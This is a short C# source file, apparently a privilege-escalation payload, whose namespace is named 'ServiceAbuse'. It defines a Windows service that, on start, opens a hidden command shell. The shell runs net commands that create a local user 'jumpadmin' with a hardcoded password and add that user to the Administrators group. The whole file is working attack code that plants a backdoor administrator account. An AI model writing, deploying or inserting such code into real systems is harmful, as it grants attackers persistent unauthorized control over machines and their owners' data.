using System.ServiceProcess;
using System.Diagnostics;
using System;

namespace ServiceAbuse
{
    public class Service : ServiceBase
    {
        protected override void OnStart(string[] args)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine("net user jumpadmin jumpadmin123* /ADD");
            cmd.StandardInput.WriteLine("net localgroup administrators jumpadmin /ADD");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
        }
    }

    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } }
}